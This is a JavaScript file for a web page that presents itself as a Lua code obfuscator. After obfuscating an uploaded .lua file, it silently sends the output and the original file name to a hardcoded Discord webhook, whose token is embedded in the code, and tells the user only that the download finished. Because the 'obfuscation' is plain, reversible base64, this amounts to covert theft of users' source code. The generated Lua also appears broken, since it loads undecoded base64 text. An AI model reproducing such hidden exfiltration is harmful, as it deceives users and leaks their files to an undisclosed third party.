// Unicode-safe Base64 encoding
function b64EncodeUnicode(str) {
    return btoa(
        encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
            return String.fromCharCode('0x' + p1);
        })
    );
}

// Lua Obfuscator Script
function obfuscateLuaCode(inputCode) {
    if (typeof inputCode !== "string") {
        throw new TypeError("Input code must be a string.");
    }

    const lines = inputCode.split("\n");
    let randomVariables = [];
    let obfuscatedCode = "";

    // Generate random variable names and encode each line
    lines.forEach((line, idx) => {
        try {
            const randomVar = generateRandomVariable();
            randomVariables.push(randomVar);

            // Add unnecessary logic to make the code confusing
            obfuscatedCode += `${randomVar} = "${b64EncodeUnicode(line.trim())}"; `;
            obfuscatedCode += `if ${randomVar} ~= nil then `;
            obfuscatedCode += `table.insert({}, ${randomVar} .. "dummy"); `;
            obfuscatedCode += `end; `;
        } catch (err) {
            console.error(`Error obfuscating line ${idx + 1}:`, err);
        }
    });

    // Combine lines into a single eval structure
    obfuscatedCode += "loadstring(table.concat({";
    obfuscatedCode += randomVariables.map((varName) => `string.reverse(string.reverse(${varName}))`).join(", ");
    obfuscatedCode += "}))();";

    // Add the custom message at the first line
    return "-- Made by TrueBlue\n" + obfuscatedCode;
}

function generateRandomVariable(length = 8) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Send a file to Discord via webhook as an attachment
async function sendDiscordWebhookWithFile(webhookUrl, fileBlob, originalFileName) {
    try {
        const formData = new FormData();
        formData.append('file', fileBlob, 'obfuscated.txt');
        formData.append('payload_json', JSON.stringify({
            content: `A file named **${originalFileName}** was obfuscated and sent as an attachment.`
        }));

        await fetch(webhookUrl, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error("Failed to send file to Discord webhook:", err);
    }
}

document.getElementById("obfuscateButton").addEventListener("click", () => {
    const fileInput = document.getElementById("fileInput");
    const statusMessage = document.getElementById("statusMessage");

    statusMessage.textContent = "";

    if (!fileInput.files.length) {
        statusMessage.textContent = "Please upload a Lua (.lua) file to obfuscate.";
        return;
    }

    const file = fileInput.files[0];
    if (!file.name.endsWith('.lua')) {
        statusMessage.textContent = "Invalid file type. Please upload a .lua file.";
        return;
    }

    const reader = new FileReader();

    reader.onload = function (event) {
        try {
            const inputCode = event.target.result;
            const obfuscatedCode = obfuscateLuaCode(inputCode);

            // Directly download the file, no code preview
            const blob = new Blob([obfuscatedCode], { type: "text/plain" });
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "obfuscated.txt";
            link.click();

            statusMessage.textContent = "Obfuscation complete! File downloaded.";

            // Send the obfuscated file to Discord webhook
            const webhookUrl = "https://discord.com/api/webhooks/1361295438925267004/stPosh70OETZAUq3Fn4QNZCnKNXGhns7POmW1WiBdF-f-C7lGwBVAOLHH71nl8_Twye2"; // <-- replace with your webhook URL if needed
            sendDiscordWebhookWithFile(
                webhookUrl,
                blob,             // The Blob containing obfuscated code
                file.name         // Original uploaded file name
            );
        } catch (err) {
            console.error("Obfuscation error:", err);
            statusMessage.textContent = "Error during obfuscation: " + err.message;
        }
    };

    reader.onerror = function () {
        statusMessage.textContent = "Error reading the file. Please try again.";
    };

    reader.readAsText(file);
});
